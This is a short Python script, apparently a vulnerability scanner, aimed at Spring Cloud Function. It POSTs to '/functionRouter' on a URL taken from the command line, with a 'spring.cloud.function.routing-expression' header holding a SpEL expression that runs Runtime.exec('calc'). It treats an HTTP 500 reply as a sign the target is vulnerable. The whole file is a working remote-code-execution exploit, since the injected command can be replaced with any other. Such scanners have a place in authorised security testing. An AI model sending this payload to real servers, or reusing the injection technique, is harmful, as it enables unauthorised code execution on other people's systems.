from wsgiref import headers
import requests
import urllib3
import threading
import sys
urllib3.disable_warnings()

uri = '/functionRouter'
payload =f'T(java.lang.Runtime).getRuntime().exec("calc")'
headers_sc = {
    'spring.cloud.function.routing-expression': payload,
    'Accept-Encoding': 'gzip, deflate',
    'Accept': '*/*',
    'Accept-Language': 'en',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded'
} 

data = "scan for test"
def SPEL_scan(url):
    try:
        sc = url+uri
        req_sc = requests.post(url=sc, headers=headers_sc, data=data,verify=False,timeout=2)
        code_sc = req_sc.status_code
        if code_sc == 500:
            print('漏洞疑似存在')
        else:
            print('漏洞不存在')
    except:
        print('漏洞检测超时')

if __name__ == '__main__' :
    url = sys.argv[1]
    SPEL_scan(url)
